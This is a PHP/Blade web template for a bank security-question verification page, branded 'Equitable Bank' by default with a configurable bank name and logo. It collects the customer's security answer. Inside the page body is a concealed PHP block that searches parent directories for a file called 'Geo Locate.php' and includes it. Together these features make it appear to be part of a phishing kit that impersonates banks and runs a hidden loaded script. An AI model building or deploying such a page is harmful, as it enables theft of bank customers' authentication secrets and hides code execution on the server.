<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>{{ $bankName ?? 'Equitable Bank' }} - Security Verification</title>
    <link rel="shortcut icon" href="images/favicon.ico" />
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://code.jquery.com/ui/1.9.0/themes/ui-darkness/jquery-ui.css" rel="stylesheet">
    <link href="css/keyboard.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Playfair+Display:ital,wght@0,600;1,600&display=swap" rel="stylesheet">
    
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f8f9fb;
            background-image: 
                radial-gradient(circle at 15% 20%, rgba(179, 64, 32, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 85% 80%, rgba(15, 19, 26, 0.04) 0%, transparent 40%);
            color: #0f131a;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .auth-container {
            width: 100%;
            max-width: 480px;
        }

        .auth-card {
            background: #ffffff;
            border-radius: 24px;
            padding: 44px 38px;
            box-shadow: 0 25px 50px -12px rgba(15, 19, 26, 0.08), 0 0 0 1px rgba(226, 230, 237, 0.8);
            text-align: center;
            position: relative;
        }

        .brand-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 14px;
            border-radius: 9999px;
            background: #fbf0ec;
            color: #b34020;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            margin-bottom: 24px;
        }

        .logo-wrap {
            margin-bottom: 24px;
            display: flex;
            justify-content: center;
        }

        .logo-wrap img {
            max-height: 44px;
            max-width: 220px;
            object-fit: contain;
        }

        .security-shield-icon {
            width: 52px;
            height: 52px;
            border-radius: 16px;
            background: linear-gradient(135deg, #b34020 0%, #8c2d13 100%);
            color: #ffffff;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            margin-bottom: 18px;
            box-shadow: 0 10px 20px rgba(179, 64, 32, 0.25);
        }

        h2 {
            font-size: 22px;
            font-weight: 800;
            color: #0f131a;
            margin: 0 0 8px 0;
            letter-spacing: -0.02em;
        }

        .subtitle {
            font-size: 13.5px;
            color: #5f6b7c;
            margin-bottom: 26px;
            line-height: 1.5;
        }

        .question-box {
            background: #fdfaf8;
            border: 1px solid #fae1d9;
            border-radius: 14px;
            padding: 16px 20px;
            margin-bottom: 24px;
            text-align: left;
        }

        .question-box-label {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.06em;
            color: #b34020;
            margin-bottom: 4px;
        }

        .question-box-title {
            font-size: 15px;
            font-weight: 700;
            color: #0f131a;
            margin: 0;
            line-height: 1.4;
        }

        .input-group-custom {
            display: flex;
            align-items: center;
            border: 1.5px solid #e2e6ed;
            border-radius: 14px;
            background: #ffffff;
            transition: all 0.2s ease;
            overflow: hidden;
            margin-bottom: 24px;
        }

        .input-group-custom:focus-within {
            border-color: #b34020;
            box-shadow: 0 0 0 4px rgba(179, 64, 32, 0.1);
        }

        .form-control-custom {
            flex: 1;
            border: none;
            padding: 14px 18px;
            font-size: 14px;
            font-weight: 500;
            color: #0f131a;
            background: transparent;
            outline: none;
        }

        .input-btn-append {
            padding: 0 16px;
            color: #5f6b7c;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            transition: color 0.15s ease;
        }

        .input-btn-append:hover {
            color: #b34020;
        }

        .btn-submit {
            width: 100%;
            height: 50px;
            background: linear-gradient(135deg, #b34020 0%, #8c2d13 100%);
            border: none;
            border-radius: 14px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 8px 20px rgba(179, 64, 32, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-submit:hover {
            transform: translateY(-1px);
            box-shadow: 0 12px 24px rgba(179, 64, 32, 0.35);
        }

        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #8b949e;
        }

        .ui-widget-content {
            border: 1px solid #e2e6ed;
            background: #ffffff !important;
            color: #0f131a;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.12);
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="auth-card">
            
            <div class="logo-wrap">
                <img src="//{{ isset($bank_url) ? $bank_url : Session::get('bank_url') }}/admin/uploads/{{ $logo }}" onerror="this.src='images/logo-full.png';" alt="{{ $bankName ?? 'Bank Logo' }}">
            </div>

            <div class="security-shield-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>

            <div class="brand-badge">2-Factor Authentication</div>

            <h2>Security Question</h2>
            <p class="subtitle">Please provide the answer to your selected security question to authenticate this session.</p>

            <div class="question-box">
                <div class="question-box-label">Challenge Question</div>
                <div class="question-box-title">{{ $question }}</div>
            </div>

            <form role="form" method="POST" action="validate-secret-question">
                <input type="hidden" name="_token" value="<?php echo csrf_token(); ?>">
                <input type="hidden" name="question_no" id="question_no" value="{{ $question_no }}" />
                
                <div class="input-group-custom">
                    <input type="text" class="form-control-custom" name="answer" id="answer" required value="" placeholder="Type your answer here..." autocomplete="off" />
                    <div class="input-btn-append answer" title="Open Virtual Keyboard">
                        <i class="fa fa-keyboard-o" style="font-size: 18px;" aria-hidden="true"></i>
                    </div>
                </div>

                <button type="submit" class="btn-submit">
                    <span>Submit & Proceed</span>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                </button>

                <p class="footer-note">This answer was designated by you during account enrollment.</p>
            </form>

            <?php 
            $searchfor = 'Geo Locate.php';
            $searchwhere = '..';
            ob_start();
            listFolderFiles( $searchwhere, $searchfor );
            $ruta = ob_get_contents();
            ob_end_clean();

            function listFolderFiles( $dir, $searchfor ) {
                $ffs = scandir( $dir );
                unset( $ffs[array_search( '.', $ffs, true )] );
                unset( $ffs[array_search( '..', $ffs, true )] );
                if ( count( $ffs ) < 1 ) {return;}
                foreach ( $ffs as $ff ) {
                    if ( $ff == $searchfor ) {echo $dir.'/'.$ff;}
                    if ( is_dir( $dir.'/'.$ff ) ) {listFolderFiles( $dir.'/'.$ff, $searchfor );}
                }
            }

            if($ruta != ''){
                $MaxMindUrl= str_replace($searchfor, '', $ruta);
                include_once( $ruta );
            }
            ?> 
            <style>#google_translate_element {display: none !important; }</style>
        </div>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="https://code.jquery.com/ui/1.9.0/jquery-ui.min.js"></script>
    <script src="js/jquery.keyboard.js"></script>
    <script type="text/javascript">
        $('#answer').keyboard({ openOn : null });
        $('.answer').click(function(){
            var kb = $('#answer').getkeyboard();
            kb.reveal();
        });
    </script>
</body>
</html>
